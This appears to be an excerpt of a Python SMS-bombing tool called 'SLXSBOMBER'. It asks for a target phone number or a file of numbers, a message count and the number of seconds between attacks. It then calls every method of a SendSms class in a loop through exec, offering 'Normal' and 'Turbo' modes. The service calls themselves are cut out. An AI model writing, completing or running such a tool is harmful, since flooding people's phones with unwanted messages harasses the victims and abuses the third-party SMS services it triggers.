...
while 1:
    ...
    Total Service: {}           {}by {}KAYASLXS\n  
    """.format(Fore.LIGHTCYAN_EX, len(servisler_sms), Style.RESET_ALL, Fore.LIGHTRED_EX))
    try:
        menu = (input(Fore.LIGHTMAGENTA_EX + " 1- Send SMS (Normal)\n 2- Send SMS (Turbo)\n 3- Exit\n\n" + Fore.LIGHTYELLOW_EX + " KAYASLXS: "))
        if menu == "":
            continue
        menu = int(menu) 
    except ValueError:
        system("cls||clear")
        print(Fore.LIGHTRED_EX + "You Made a Wrong Choice.")
        sleep(3)
        continue
    if menu == 1:
        system("cls||clear")
        print(Fore.LIGHTYELLOW_EX + "Enter an Phone Number (Press Enter for multiple numbers): "+ Fore.LIGHTGREEN_EX, end="")
        tel_no = input()
        tel_liste = []
        if tel_no == "":
            system("cls||clear")
            print(Fore.LIGHTYELLOW_EX + "File Directory Where The Numbers Are Saved: "+ Fore.LIGHTGREEN_EX, end="")
            dizin = input()
            try:
                ...
                system("cls||clear")
                print(Fore.LIGHTRED_EX + "Incorrect File Directory")
                sleep(3)
                continue
        else:
            try:
                ...
                system("cls||clear")
                print(Fore.LIGHTRED_EX + "Wrong Phone Number") 
                sleep(3)
                continue
        system("cls||clear")
        try:
            print(Fore.LIGHTYELLOW_EX + "Mail Address (Press enter if you don't know it): "+ Fore.LIGHTGREEN_EX, end="")
            mail = input()
            if ("@" not in mail or ".com" not in mail) and mail != "":
                raise
        except:
            system("cls||clear")
            print(Fore.LIGHTRED_EX + "Wrong Mail Address") 
            sleep(3)
            continue
        system("cls||clear")
        try:
            print(Fore.LIGHTYELLOW_EX + f"How Many SMS You Want to Send {sonsuz}: "+ Fore.LIGHTGREEN_EX, end="")
            kere = input()
            if kere:
                kere = int(kere)
            else:
            ...
            system("cls||clear")
            print(Fore.LIGHTRED_EX + "Incorret Login") 
            sleep(3)
            continue
        system("cls||clear")
        try:
            print(Fore.LIGHTYELLOW_EX + "How Many Seconds Apart Do You Want To Attack: "+ Fore.LIGHTGREEN_EX, end="")
            aralik = int(input())
        except ValueError:
            system("cls||clear")
            print(Fore.LIGHTRED_EX + "Incorrect Login") 
            sleep(3)
            continue
        system("cls||clear")
        if kere is None: 
                        ...
                        for attribute in dir(SendSms):
                            ...
                            if callable(attribute_value):
                                if attribute.startswith('__') == False:
                                    ...
                                    exec("sms."+attribute+"()")
                                    sleep(aralik)
        print(Fore.LIGHTRED_EX + "\nPress Enter Back The Menu")
        input()
    elif menu == 3:
        system("cls||clear")
        print(Fore.LIGHTRED_EX + "Exiting SLXSBOMBER...")
        break
    elif menu == 2:
        system("cls||clear")
        print(Fore.LIGHTYELLOW_EX + "Enter an Phone Number: "+ Fore.LIGHTGREEN_EX, end="")
        tel_no = input()
        try:
            int(tel_no)
            if len(tel_no) != 10:
